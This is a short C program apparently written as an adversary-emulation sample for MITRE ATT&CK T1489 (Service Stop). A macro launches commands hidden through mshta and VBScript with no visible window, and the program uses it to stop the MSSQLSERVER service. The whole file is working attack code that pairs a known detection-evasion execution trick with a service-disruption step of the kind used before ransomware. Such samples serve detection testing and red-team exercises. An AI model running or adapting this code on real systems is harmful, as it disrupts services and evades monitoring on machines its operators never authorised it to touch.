// Link      = https://attack.mitre.org/techniques/T1489/
// Technique = Service Stop
// ID        = T1489.000
// Tactics   = Impact

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"" to_run "\"\",0)(window.close)\")",\
     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("C:\\Windows\\System32\\net.exe stop MSSQLSERVER");

    return 0;
}
